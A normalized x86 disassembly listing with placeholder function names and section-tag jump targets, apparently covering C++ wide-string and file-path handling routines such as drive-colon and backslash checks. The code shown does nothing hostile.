test eax sub_10001a27
je r-xdata
push ebx
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x7c ]
call sub_10011dc6
lea eax [ ebp - 0x7c ]
push eax
lea eax [ ebp - 0x98 ]
push esi
push eax
mov [ ebp - 0x4 ] 0x4
call sub_1003be95
add esp 0xc
push [ ebp - 0x44 ]
mov ecx [ edi ]
push [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x5
push eax
call sub_1003bfb5
xor esi esi
push ebx
inc esi
push esi
lea ecx [ ebp - 0x98 ]
mov [ ebp - 0x4 ] 0x4
call sub_10001500
push ebx
push esi
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0x1
call sub_10001500
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005326
cmp [ eax ] 0x2e
jne r-xdata
mov ecx edi
call sub_1003bd5e
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10001500
cmp [ ebp - 0x18 ] esi
je r-xdata
push ebx
push edi
call sub_1003c635
pop ecx
pop ecx
push esi
lea ecx [ ebp - 0x2c ]
call sub_10005326
cmp [ eax ] 0x2e
jne r-xdata
cmp [ ebp - 0x18 ] 0x2
jne r-xdata
sub_1003c9ba
push 0x4
mov eax sub_1004bea9
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
call sub_10023577
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
mov eax esi
call sub_100282db
retn 0x8
sub_1003c9f0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ esi ] eax
mov eax [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x20 ]
mov [ ebp - 0x4 ] ecx
xor ecx ecx
mov [ edi ] eax
mov eax [ esi ]
cmp eax ebx
setne cl
mov [ ebp + 0x14 ] ecx
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ edi ]
cmp ecx [ ebp + 0x1c ]
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ esi ]
add edx 0x8
push edx
push [ ebp + 0x8 ]
mov edx ebx
sub edx eax
push edx
push eax
push ecx
call sub_1002382a
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
mov [ esi ] ebx
cmp eax 0xffffffff
je r-xdata
push 0x2
pop eax
jmp r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x1c
cmp eax 0xfffffffd
jne r-xdata
mov ecx [ edi ]
cmp [ ecx ] ax
jne r-xdata
add [ esi ] eax
add [ edi ] 0x2
and [ ebp + 0x14 ] 0x0
cmp [ esi ] ebx
jne r-xdata
xor eax eax
push [ esi ]
call sub_10024630
pop ecx
inc eax
jmp r-xdata
sub_1003ca84
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x14 ]
mov [ esi ] eax
mov eax [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x20 ]
mov [ ebp - 0x1c ] ecx
xor ecx ecx
mov [ edi ] eax
mov eax [ esi ]
cmp eax [ ebp + 0x10 ]
mov [ ebp - 0x20 ] ebx
setne cl
mov [ ebp - 0x14 ] ecx
cmp eax [ ebp + 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
cmp [ edi ] eax
je r-xdata
mov eax [ edi ]
mov [ ebp - 0x10 ] eax
call sub_10029b16
mov ecx [ ebp - 0x18 ]
sub ecx [ ebp - 0x10 ]
cmp eax ecx
jg r-xdata
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x1c ]
add eax 0x8
push eax
mov eax [ esi ]
movzx eax [ eax ]
push ebx
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_100234f0
mov ebx eax
add esp 0x10
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x1c ]
add eax 0x8
push eax
mov eax [ esi ]
movzx eax [ eax ]
push ebx
push eax
push [ ebp - 0x10 ]
call sub_100234f0
add esp 0x10
test eax eax
jl r-xdata
push 0x2
pop eax
jmp r-xdata
mov eax [ edi ]
mov ecx [ ebp - 0x18 ]
sub ecx eax
cmp ecx ebx
jl r-xdata
add [ esi ] 0x2
add [ edi ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn 0x1c
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x20 ]
mov [ ecx ] eax
push ebx
lea edx [ ebp - 0xc ]
push edx
push ecx
push eax
call sub_100242f1
add [ esi ] 0x2
add esp 0x10
add [ edi ] ebx
mov ebx [ ebp - 0x20 ]
mov eax [ ebp + 0x10 ]
and [ ebp - 0x14 ] 0x0
cmp [ esi ] eax
jne r-xdata
jmp r-xdata
sub_1003cb88
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x10 ] 0x0
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax ecx
mov ecx [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
add eax 0x8
push eax
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp + 0xc ]
push edi
mov [ esi ] ecx
mov ecx [ edi ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov [ ebp - 0x18 ] ecx
call sub_100234f0
mov ebx eax
add esp 0x10
test ebx ebx
jg r-xdata
mov eax [ esi ]
mov ecx [ ebp - 0x14 ]
dec ebx
sub ecx eax
cmp ecx ebx
jge r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x18 ]
mov [ edi ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn 0x10
push ebx
lea edx [ ebp - 0xc ]
push edx
push ecx
push eax
call sub_100242f1
add esp 0x10
add [ esi ] ebx
sub_1003cc1c
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x14 ] ebx
jbe r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn 0x10
cmp esi [ ebp + 0x10 ]
je r-xdata
lea eax [ edi + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x10 ]
sub eax esi
push eax
lea eax [ ebp + 0x8 ]
push esi
push eax
call sub_1002382a
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
cmp eax 0xffffffff
je r-xdata
test eax eax
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
cmp [ ebp + 0x8 ] ax
jne r-xdata
add esi eax
inc ebx
cmp ebx [ ebp + 0x14 ]
jb r-xdata
xor eax eax
push esi
call sub_10024630
pop ecx
inc eax
sub_1003cc8e
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ecx + 0x14 ]
push ebx
push esi
push edi
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov ecx [ ecx + 0x14 ]
mov eax [ ebp + 0xc ]
cmp eax ecx
jb r-xdata
or eax 0xffffffff
sub eax [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
cmp edx eax
jb r-xdata
pop ebp
retn 0xc
mov eax ecx
jmp r-xdata
mov eax [ ecx + 0x18 ]
mov [ ebp + 0xc ] eax
lea esi [ ecx + 0x4 ]
cmp eax 0x8
jb r-xdata
mov edx eax
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x8
jb r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
push edi
call sub_10003398
add esp 0xc
test eax eax
je r-xdata
lea edi [ eax + edx * 2 ]
mov eax [ ebp + 0x8 ]
movzx ebx [ eax ]
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x8
jb r-xdata
dec edi
dec edi
jmp r-xdata
cmp edi eax
je r-xdata
mov eax edi
sub eax esi
sar eax 0x1
jmp r-xdata
mov esi [ esi ]
cmp [ edi ] bx
jne r-xdata
pop edi
pop esi
pop ebx
sub_1003cd1f
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x10 ] 0x0
push ebx
push esi
push edi
jbe r-xdata
or eax 0xffffffff
mov edx [ ecx + 0x14 ]
cmp [ ebp + 0xc ] edx
jae r-xdata
mov edi [ ecx + 0x18 ]
mov [ ebp - 0x4 ] edi
lea esi [ ecx + 0x4 ]
cmp edi 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
lea ebx [ eax + edx * 2 ]
cmp edi 0x8
jb r-xdata
cmp edi ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
lea edi [ eax + ecx * 2 ]
jmp r-xdata
movzx eax [ edi ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_10014856
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x8
jb r-xdata
inc edi
inc edi
mov eax edi
sub eax esi
sar eax 0x1
jmp r-xdata
mov esi [ esi ]
pop edi
pop esi
pop ebx
leave
retn 0xc
sub_1003cd94
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
push ebx
push esi
push edi
jbe r-xdata
or eax 0xffffffff
mov eax [ ecx + 0x14 ]
test eax eax
jbe r-xdata
mov edx [ ebp + 0xc ]
cmp edx eax
jb r-xdata
mov ebx [ ecx + 0x18 ]
lea edi [ ecx + 0x4 ]
cmp ebx 0x8
jb r-xdata
lea edx [ eax - 0x1 ]
mov eax edi
mov eax [ edi ]
jmp r-xdata
movzx eax [ esi ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_10014856
add esp 0xc
test eax eax
je r-xdata
lea esi [ eax + edx * 2 ]
jmp r-xdata
cmp ebx 0x8
jb r-xdata
cmp ebx 0x8
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax esi
sub eax edi
sar eax 0x1
jmp r-xdata
mov edi [ edi ]
dec esi
dec esi
cmp esi eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_1003ce49
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
cmp esi 0x2
jne r-xdata
test esi esi
je r-xdata
push 0x0
mov ecx ebx
call sub_10005326
movzx eax [ eax ]
push eax
call sub_1003c9a3
pop ecx
test al al
je r-xdata
lea eax [ esi - 0x1 ]
push eax
push r--data
mov ecx ebx
call sub_1003ce28
mov edi eax
cmp edi 0xffffffff
jne r-xdata
lea edi [ esi - 0x1 ]
push edi
mov ecx ebx
call sub_10005326
movzx eax [ eax ]
push eax
call sub_1003c9a3
pop ecx
test al al
je r-xdata
push 0x1
mov ecx ebx
call sub_10005326
movzx eax [ eax ]
push eax
call sub_1003c9a3
pop ecx
test al al
je r-xdata
cmp edi 0x1
jne r-xdata
push 0x1
add esi 0xfffffffe
push esi
lea eax [ ebp + 0xc ]
push eax
mov ecx ebx
mov [ ebp + 0xc ] 0x3a
call sub_1003cc8e
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov eax edi
jmp r-xdata
xor eax eax
lea eax [ edi + 0x1 ]
jmp r-xdata
push 0x0
mov ecx ebx
call sub_10005326
movzx eax [ eax ]
push eax
call sub_1003c9a3
pop ecx
test al al
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1003cf07
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
push 0x2
pop edi
cmp ebx edi
jbe r-xdata
jne r-xdata
push 0x1
mov ecx esi
call sub_10005326
cmp [ eax ] 0x3a
jne r-xdata
cmp ebx 0x3
jbe r-xdata
push 0x0
mov ecx esi
call sub_10005326
movzx eax [ eax ]
push eax
call sub_1003c9a3
pop ecx
test al al
je r-xdata
cmp ebx edi
push edi
mov ecx esi
call sub_10005326
movzx eax [ eax ]
push eax
call sub_1003c9a3
pop ecx
test al al
je r-xdata
test ebx ebx
jbe r-xdata
push 0x0
mov ecx esi
call sub_10005326
movzx eax [ eax ]
push eax
call sub_1003c9a3
pop ecx
test al al
je r-xdata
push 0x0
mov ecx esi
call sub_10005326
movzx eax [ eax ]
push eax
call sub_1003c9a3
pop ecx
test al al
je r-xdata
push 0x1
mov ecx esi
call sub_10005326
movzx eax [ eax ]
push eax
call sub_1003c9a3
pop ecx
test al al
je r-xdata
mov eax edi
jmp r-xdata
or eax 0xffffffff
push 0x1
mov ecx esi
call sub_10005326
movzx eax [ eax ]
push eax
call sub_1003c9a3
pop ecx
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
push edi
mov ecx esi
call sub_10005326
movzx eax [ eax ]
push eax
call sub_1003c9a3
pop ecx
test al al
jne r-xdata
push edi
push r--data
mov ecx esi
call sub_1003ce07
cmp eax ebx
jb r-xdata
jmp r-xdata
sub_1003cff6
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ecx ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
neg eax
push eax
lea ecx [ ebp - 0x8 ]
call sub_10017b9e
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x8
sub_1003d026
push ecx
push ebx
push esi
mov esi ecx
push edi
push [ esi + 0x14 ]
push esi
call sub_1003ce49
cmp [ esi + 0x14 ] 0x0
pop ecx
pop ecx
mov edi eax
je r-xdata
mov [ esp + 0xf ] 0x0
push edi
mov ecx esi
call sub_10005326
movzx eax [ eax ]
push eax
call sub_1003c9a3
pop ecx
mov [ esp + 0xf ] 0x1
test al al
jne r-xdata
cmp edi 0x1
jne r-xdata
push ebp
lea ebp [ edi - 0x1 ]
push edi
push esi
call sub_1003cf07
pop ecx
pop ecx
mov ebx eax
test edi edi
jbe r-xdata
mov eax edi
test ebx ebx
jne r-xdata
pop ebp
push ebp
mov ecx esi
call sub_10005326
movzx eax [ eax ]
push eax
call sub_1003c9a3
pop ecx
test al al
je r-xdata
cmp [ esp + 0xf ] bl
je r-xdata
dec edi
dec ebp
test edi edi
ja r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ebp ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
retn
sub_1003d0ae
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0x7
call sub_100016a9
mov eax [ esp + 0xc ]
cmp [ esp + 0x8 ] eax
je r-xdata
mov eax esi
pop esi
retn 0x8
sub eax [ esp + 0x8 ]
mov ecx esi
sar eax 0x1
push eax
push [ esp + 0xc ]
call sub_100015b5
sub_1003d0f7
push 0x4
mov eax sub_1004b778
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi + 0x4 ] 0x1
mov edi [ ebp + 0x8 ]
and [ esi + 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
mov al [ edi + 0x14 ]
mov [ esi + 0x14 ] al
lea eax [ edi + 0x18 ]
push eax
lea ecx [ esi + 0x18 ]
call sub_10001fc2
push edi
push esi
mov [ ebp - 0x4 ] 0x1
call sub_1003e666
pop ecx
pop ecx
mov eax esi
call sub_100282db
retn 0x4
sub_1003d155
push 0x94
mov eax sub_1004bfe0
call sub_10028203
xor esi esi
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x8 ]
cmp edi esi
je r-xdata
push 0x2
pop eax
call sub_100282db
retn
cmp [ edi ] esi
jne r-xdata
push 0x10
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
push 0x3
mov [ ebp - 0x4 ] esi
pop esi
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_1003c9ba
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
test [ ebp - 0x10 ] 0x2
mov [ edi ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_1003d206
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x0
je r-xdata
xor eax eax
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10008a50
mov ecx eax
call sub_1003cff6
mov ecx eax
call sub_10005274
cmp [ eax ] 0x3a
je r-xdata
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx esi
call sub_10008a50
mov ecx eax
call sub_1003cff6
mov ecx eax
call sub_10005274
movzx eax [ eax ]
push eax
call sub_1003c9a3
pop ecx
test al al
jne r-xdata
push edi
mov edi [ esi + 0x14 ]
push 0x5c
push 0x1
mov ecx esi
call sub_1000517a
mov eax edi
pop edi
jmp r-xdata
pop esi
leave
retn
sub_1003d27e
push 0x4
mov eax sub_1004ba1a
call sub_10028203
mov esi ecx
and [ ebp - 0x10 ] 0x0
push 0x34
call sub_10024389
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_1003d0f7
jmp r-xdata
mov eax esi
call sub_100282db
retn 0x8
mov ecx rw-data
call sub_10003459
push eax
push [ ebp + 0xc ]
push [ esi ]
call sub_1003e344
mov eax [ esi ]
and [ eax + 0x10 ] 0x0
mov ecx [ esi ]
add esp 0xc
push r--data
add ecx 0x18
call sub_10001c62
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0xc ] 0x0
mov [ esi ] eax
je r-xdata
sub_1003d2f6
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003d155
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_1003d393
push 0x48
mov eax sub_1004ba71
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
push 0x0
call sub_100230bc
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x4 ]
call sub_10003d21
lea ecx [ esi + 0x20 ]
mov [ ebp - 0x4 ] 0x1
call sub_10003d21
lea ecx [ esi + 0x3c ]
mov [ ebp - 0x4 ] 0x2
call sub_10003d21
lea ecx [ esi + 0x58 ]
mov [ ebp - 0x4 ] 0x3
call sub_10003d21
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x4
jne r-xdata
push [ ebp + 0x8 ]
push esi
call sub_10023447
pop ecx
pop ecx
mov eax esi
call sub_100282db
retn 0x4
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001c7f
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x5
call sub_10002075
push r--data
lea eax [ ebp - 0x54 ]
push eax
call sub_10027dd1
sub_1003d425
push 0x7c
mov eax sub_1004baa2
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi ecx
mov [ ebp - 0x88 ] esi
mov [ esi + 0x4 ] eax
and [ ebp - 0x4 ] 0x0
push r--data
lea ecx [ ebp - 0x84 ]
mov [ esi ] r--data
call sub_1003d393
mov [ ebp - 0x4 ] 0x1
call sub_10023577
lea ecx [ ebp - 0x84 ]
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
mov [ ebp - 0x4 ] 0x0
call sub_1000384f
mov eax esi
call sub_100282ef
retn 0x4
sub_1003d49a
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] 0x0
push edi
mov edi ecx
je r-xdata
mov eax edi
pop edi
pop esi
leave
retn 0x4
lea eax [ ebp - 0x8 ]
push eax
mov ecx esi
call sub_10008a30
mov ecx eax
call sub_10005274
movzx eax [ eax ]
push eax
call sub_1003c9a3
pop ecx
test al al
jne r-xdata
push 0xffffffff
push 0x0
push esi
mov ecx edi
call sub_1000541a
mov ecx edi
call sub_1003d206
sub_1003d4e7
push 0x8
mov eax sub_1004badc
call sub_10028203
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_10003a7e
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_10024389
pop ecx
mov ecx eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0x1
test ecx ecx
je r-xdata
xor eax eax
call sub_1003d481
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] 0x0
call sub_1003d27e
lea ecx [ ebp - 0x10 ]
call sub_10003c49
mov eax [ ebp + 0x8 ]
call sub_100282db
retn
sub_1003d543
push 0x0
mov eax sub_1004bb05
call sub_10028203
test [ rw-data ] 0x1
mov esi rw-data
jne r-xdata
mov eax esi
call sub_100282db
retn
or [ rw-data ] 0x1
and [ esp + 0x18 ] 0x0
push esi
call sub_1003d4e7
mov [ esp ] sub_1004fda5
call sub_10028434
pop ecx
sub_1003d584
push 0x0
mov eax sub_1004bb2e
call sub_10028203
test [ rw-data ] 0x1
jne r-xdata
mov eax rw-data
call sub_100282db
retn
or [ rw-data ] 0x1
and [ esp + 0x18 ] 0x0
call sub_1003d543
push eax
call sub_1003d2f6
pop ecx
mov [ rw-data ] eax
sub_1003d5c1
push 0x20
mov eax sub_1004bb59
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_10003efc
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_1000134a
mov [ ebp - 0x4 ] 0x1
call sub_1003d584
push [ eax ]
lea eax [ ebp - 0x2c ]
push esi
push eax
call sub_10011eb6
add esp 0xc
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x0
call sub_10001500
mov eax esi
call sub_100282db
retn 0x8
sub_1003d618
push 0x24
mov eax sub_1004bb84
call sub_1002826c
mov esi [ ebp + 0x8 ]
mov edi ecx
mov [ ebp - 0x30 ] edi
call sub_10003efc
and [ ebp - 0x4 ] 0x0
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax edi
call sub_100282ef
retn 0x8
push [ ebp + 0xc ]
lea ecx [ ebp - 0x2c ]
push esi
call sub_1003d0ae
mov [ ebp - 0x4 ] 0x1
call sub_1003d584
cmp [ ebp - 0x14 ] 0x8
mov ecx [ ebp - 0x28 ]
mov eax ecx
jae r-xdata
mov edx [ ebp - 0x18 ]
lea eax [ eax + edx * 2 ]
push eax
push ecx
mov ecx edi
call sub_10012509
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x0
call sub_10001500
lea eax [ ebp - 0x28 ]
mov ecx eax
sub_1003d688
push 0x3c
mov eax sub_1004bbf4
call sub_10028203
mov esi ecx
xor edi edi
mov [ ebp - 0x10 ] edi
call sub_1003d026
xor ebx ebx
inc ebx
cmp eax 0xffffffff
jne r-xdata
mov edi [ esi + 0x18 ]
lea ecx [ esi + 0x4 ]
cmp edi 0x8
jb r-xdata
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] 0x7
call sub_100016a9
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov edx ecx
mov edx [ ecx ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000136c
or [ ebp - 0x10 ] 0x4
test [ ebp - 0x10 ] 0x2
mov [ ebp - 0x4 ] ebx
je r-xdata
lea eax [ edx + eax * 2 ]
push eax
push ecx
lea ecx [ ebp - 0x48 ]
call sub_1003d618
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] ecx
xor edi edi
mov ecx [ ecx ]
cmp edi 0x8
jb r-xdata
mov [ ebp - 0x4 ] edi
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
push edi
push ebx
lea ecx [ ebp - 0x48 ]
call sub_10001500
mov eax [ ebp + 0x8 ]
call sub_100282db
retn 0x4
and [ ebp - 0x10 ] 0xfffffffe
push edi
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10001500
sub_1003d738
push 0x20
mov eax sub_1004bc1f
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x2c ]
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
call sub_10002075
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x2
call sub_10002020
mov eax [ ebp + 0x8 ]
mov [ esi ] r--data
mov [ esi + 0x28 ] eax
mov eax [ ebp + 0xc ]
lea ecx [ esi + 0x30 ]
mov [ esi + 0x2c ] eax
call sub_10003d21
mov eax esi
call sub_100282db
retn 0xc
sub_1003d797
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
lea eax [ ebp - 0x8 ]
push eax
mov esi ecx
call sub_1001793b
mov edi [ eax ]
mov ebx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
push eax
mov ecx esi
call sub_1001793b
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
push ebx
push edi
push [ eax + 0x4 ]
push [ eax ]
call sub_100174af
pop edi
pop esi
pop ebx
leave
retn 0xc
sub_1003d7d6
push ebp
mov ebp esp
sub esp 0x54
mov ecx [ ebp + 0x1c ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
push esi
lea edx [ ebp + 0x1c ]
push edx
push [ ebp + 0x14 ]
lea edx [ ebp - 0x8 ]
push [ ebp + 0x10 ]
push edx
push [ ebp + 0xc ]
lea edx [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push edx
call [ eax + 0x14 ]
mov esi eax
test esi esi
je r-xdata
push [ ebp + 0x1c ]
mov ecx [ ebp + 0x18 ]
push [ ebp + 0x1c ]
push [ ebp + 0x10 ]
call sub_1003d797
pop esi
leave
retn
push r--data
call sub_1003da35
push eax
push esi
lea ecx [ ebp - 0x54 ]
call sub_1003d738
push r--data
lea eax [ ebp - 0x54 ]
push eax
call sub_10027dd1
sub_1003d83d
push ebp
sub esp 0x100
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x100 ] eax
push 0x10
mov eax sub_1004bc42
call sub_10028203
mov eax [ ebp + 0x114 ]
mov edi [ ebp + 0x110 ]
mov esi [ ebp + 0x10c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x118 ]
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] eax
test edi edi
jne r-xdata
cmp esi edi
je r-xdata
push esi
call sub_100246bb
pop ecx
lea edi [ esi + eax * 2 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x100 ]
xor ecx ebp
call sub_100242d7
add ebp 0x104
leave
retn
mov eax edi
sub eax esi
sar eax 0x1
lea ebx [ eax * 4 + 0x4 ]
cmp ebx 0x100
jbe r-xdata
push [ ebp - 0x14 ]
lea eax [ ebp + 0x100 ]
push [ ebp - 0x10 ]
push eax
lea eax [ ebp ]
push eax
push edi
push esi
call sub_1003d7d6
add esp 0x18
push ebx
call sub_10024077
mov esi eax
